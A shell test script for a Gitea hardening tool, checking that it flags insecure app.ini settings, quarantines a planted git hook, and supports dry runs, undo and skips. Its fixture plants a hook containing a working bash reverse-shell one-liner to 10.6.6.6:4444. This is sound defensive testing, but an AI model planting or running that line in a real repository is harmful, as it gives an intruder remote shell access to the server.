#!/bin/sh
# Tests for roles/applications/SV-45-gitea-hardening.sh.
# A fake root (--root) with /etc/gitea/app.ini (install page open, sign-ups
# on, git hooks allowed, local migrations, webhooks to private addresses,
# world-readable), two repositories: one with only Gitea's own hooks, one
# with a planted post-receive.d/backdoor, and a sqlite database with two
# admins when sqlite3 is here.  Checks: each finding; a dry run changes
# nothing; --apply writes each setting in its section; the planted hook is
# quarantined, Gitea's are not; the undo puts every file back; --skip; the
# questions on a terminal.  Nothing outside the fake root is touched.
. "$(dirname "$0")/helper.sh"
SH=${TEST_SHELL:-sh}
C="$T_ROOT/roles/applications/SV-45-gitea-hardening.sh"
export BT_SKIP_VERIFY=1
O="$T_TMP/out"; F="$T_TMP/root"; RP="$F/var/lib/gitea/data/gitea-repositories"

mkroot() {
    rm -rf "$F"
    mkdir -p "$F/etc/gitea" "$RP/alice/site.git/hooks/post-receive.d" "$RP/alice/site.git/hooks/pre-receive.d" \
        "$RP/bob/tools.git/hooks/post-receive.d" "$F/var/lib/gitea/data"
    cat >"$F/etc/gitea/app.ini" <<'EOF'
APP_NAME = Gitea
RUN_USER = git

[server]
HTTP_PORT = 3000
ROOT_URL = http://10.100.1.100:3000/
APP_DATA_PATH = /var/lib/gitea/data

[database]
DB_TYPE = sqlite3
PATH = /var/lib/gitea/data/gitea.db
PASSWD = GiteaDbPass45

[security]
INSTALL_LOCK = false
DISABLE_GIT_HOOKS = false
SECRET_KEY = s3cretKey45

[service]
DISABLE_REGISTRATION = false

[webhook]
ALLOWED_HOST_LIST = *
EOF
    printf '\n[migrations]\nALLOW_LOCALNETWORKS = true\n' >>"$F/etc/gitea/app.ini"
    chmod 644 "$F/etc/gitea/app.ini"
    for _r in "$RP/alice/site.git" "$RP/bob/tools.git"; do
        for _h in pre-receive update post-receive; do
            printf '#!/usr/bin/env bash\n# AUTO GENERATED BY GITEA, DO NOT MODIFY\ndata=$(cat)\nfor hook in ${hookdir}/%s.d/*; do test -x "${hook}" && "${hook}"; done\n' "$_h" >"$_r/hooks/$_h"
        done
        mkdir -p "$_r/hooks/post-receive.d"
        printf '#!/usr/bin/env bash\n# AUTO GENERATED BY GITEA, DO NOT MODIFY\n"/usr/local/bin/gitea" hook --config=/etc/gitea/app.ini post-receive\n' >"$_r/hooks/post-receive.d/gitea"
        printf '#!/bin/sh\n' >"$_r/hooks/update.sample"
    done
    printf '#!/bin/sh\nbash -i >& /dev/tcp/10.6.6.6/4444 0>&1 &\n' >"$RP/bob/tools.git/hooks/post-receive.d/backdoor"
    printf 'root:x:0:\ngit:x:112:\n' >"$F/etc/group"
    if command -v sqlite3 >/dev/null 2>&1; then
        sqlite3 "$F/var/lib/gitea/data/gitea.db" "create table user (name text, is_admin int, type int); insert into user values ('gitadmin',1,0),('alice',0,0),('rt_admin',1,0),('org1',0,1);"
    fi
}
run() { $SH "$C" --root "$F" --out "$O" --no-color "$@"; }
snap() { (cd "$F" && find . -exec ls -lnd {} + | awk '{ print $1, $3, $4, $NF }' | sort; find . -type f -exec cat {} +) | cksum; }
ini() { awk -v s="$1" -v k="$2" '/^\[/ { c = $0; gsub(/[][]/, "", c); next } c == s && $1 == k { v = $3 } END { print v }' "$F/etc/gitea/app.ini"; }

t_start "options"
$SH "$C" --only everything >/dev/null 2>&1; t_eq "$?" 2 "an unknown fix exits 2"
out=$($SH "$C" --help 2>&1); t_has "$out" "webhook-local" "--help"
mkdir -p "$T_TMP/empty"
out=$($SH "$C" --root "$T_TMP/empty" --out "$O" --no-color --batch 2>&1); t_eq "$?" 0 "no Gitea: exits 0"
t_has "$out" "No Gitea here" "and says so"

t_start "find"
mkroot; before=$(snap)
out=$(run --batch 2>&1)
t_has "$out" "==========[ 1/4  what this Gitea is ]==========" "the look: numbered headers"
t_has "$out" "web:        http on port 3000" "the web port"
t_has "$out" "git over SSH: through the system sshd as user git" "SSH through sshd"
t_has "$out" "[!] INSTALL_LOCK is not true" "the open install page is HIGH"
t_has "$out" "[*] anyone can sign up" "sign-ups are MED"
t_has "$out" "[!] DISABLE_GIT_HOOKS = false" "git hooks allowed is HIGH"
t_has "$out" "[!] migrations may read this box" "local migrations are HIGH"
t_has "$out" "[*] webhooks may call this box or the inside network (ALLOWED_HOST_LIST = *)" "webhooks anywhere are MED"
t_has "$out" "/etc/gitea/app.ini can be read by every user" "a readable app.ini is MED"
t_has "$out" "repositories: 2 in /var/lib/gitea/data/gitea-repositories" "the repositories are found"
t_has "$out" "[!] a hook Gitea did not put there (runs on every push): /var/lib/gitea/data/gitea-repositories/bob/tools.git/hooks/post-receive.d/backdoor" "the planted hook is HIGH"
t_hasnt "$out" "did not put there (runs on every push): /var/lib/gitea/data/gitea-repositories/alice" "Gitea's own hooks are fine"
t_hasnt "$out" "update.sample" "git's samples are left out"
command -v sqlite3 >/dev/null 2>&1 && t_has "$out" "admin accounts: gitadmin rt_admin" "the admins are listed (not the organisation)"
t_has "$out" "Dry run: nothing was changed" "dry run without --apply"
t_eq "$(snap)" "$before" "a dry run changes nothing"
t_fail "no passwords or keys in the output" sh -c "grep -rqE 'GiteaDbPass45|s3cretKey45' '$O'"
t_fail "no CSV files are left" sh -c "find '$O' -name '*.csv' | grep -q ."

t_start "apply"
_u0=$(cat "$O"/undo-*.log 2>/dev/null | grep -c .)
out=$(run --batch --no-protected --apply --no-timer 2>&1)
t_eq "$(ini security INSTALL_LOCK)" true "INSTALL_LOCK = true"
t_eq "$(ini security DISABLE_GIT_HOOKS)" true "DISABLE_GIT_HOOKS = true"
t_eq "$(ini service DISABLE_REGISTRATION)" true "DISABLE_REGISTRATION = true"
t_eq "$(ini migrations ALLOW_LOCALNETWORKS)" false "ALLOW_LOCALNETWORKS = false"
t_eq "$(ini webhook ALLOWED_HOST_LIST)" external "ALLOWED_HOST_LIST = external"
t_eq "$(grep -c 'INSTALL_LOCK' "$F/etc/gitea/app.ini")" 1 "each setting is written once"
t_has "$(cat "$F/etc/gitea/app.ini")" "; BT SV-45" "marked on its own line (Gitea ignores inline comments)"
t_eq "$(ini database PASSWD)" GiteaDbPass45 "other settings are kept"
t_eq "$(ls -l "$F/etc/gitea/app.ini" | cut -c1-10)" "-rw-r-----" "app.ini is 640"
t_fail "the planted hook is quarantined" test -f "$RP/bob/tools.git/hooks/post-receive.d/backdoor"
t_ok "Gitea's own hook stays" test -f "$RP/bob/tools.git/hooks/post-receive.d/gitea"
out=$(run --batch 2>&1)
t_has "$out" "Nothing to change" "a second run finds nothing"
cat "$O"/undo-*.log | awk -F'\t' -v n="$_u0" 'NR > n { l[NR] = $4 } END { for (i = NR; i > n; i--) print l[i] }' >"$T_TMP/undo.sh"
sh "$T_TMP/undo.sh" >/dev/null 2>&1
t_eq "$(snap)" "$before" "undo puts every file back"

t_start "a missing setting and section are added"
mkroot
printf 'RUN_USER = git\n[server]\nHTTP_PORT = 3000\n' >"$F/etc/gitea/app.ini"
out=$(run --batch --no-protected --apply --no-timer --only install-lock,git-hooks,no-register 2>&1)
t_eq "$(ini security INSTALL_LOCK)" true "INSTALL_LOCK added in a new [security]"
t_eq "$(ini service DISABLE_REGISTRATION)" true "DISABLE_REGISTRATION added in a new [service]"
t_hasnt "$out" "DISABLE_GIT_HOOKS" "git hooks off by default: nothing to do"

t_start "--skip"
mkroot
out=$(run --batch --no-protected --apply --no-timer --skip no-register,repo-hooks 2>&1)
t_eq "$(ini service DISABLE_REGISTRATION)" false "--skip no-register leaves sign-ups"
t_ok "--skip repo-hooks leaves the hook" test -f "$RP/bob/tools.git/hooks/post-receive.d/backdoor"
t_eq "$(ini security INSTALL_LOCK)" true "the rest is done"

t_start "questions on a terminal"
if command -v script >/dev/null 2>&1; then
    mkroot
    # install-lock y, no-register n, git-hooks y, local-migrate n, webhook-local n, config-perms n, repo-hooks y; apply Enter
    printf 'y\nn\ny\nn\nn\nn\ny\n\n' >"$T_TMP/ans"
    tt=$(BT_NO_TTY=0 script -qc "$SH '$C' --root '$F' --out '$O' --no-color --no-protected --apply --no-timer" /dev/null <"$T_TMP/ans" 2>&1)
    t_has "$tt" "[y] yes, do it" "each fix lists its answers"
    t_eq "$(ini security INSTALL_LOCK)" true "y: INSTALL_LOCK"
    t_eq "$(ini service DISABLE_REGISTRATION)" false "n: sign-ups stay"
    t_eq "$(ini migrations ALLOW_LOCALNETWORKS)" true "n: migrations stay"
    t_fail "y: the hook is quarantined" test -f "$RP/bob/tools.git/hooks/post-receive.d/backdoor"
fi
t_done
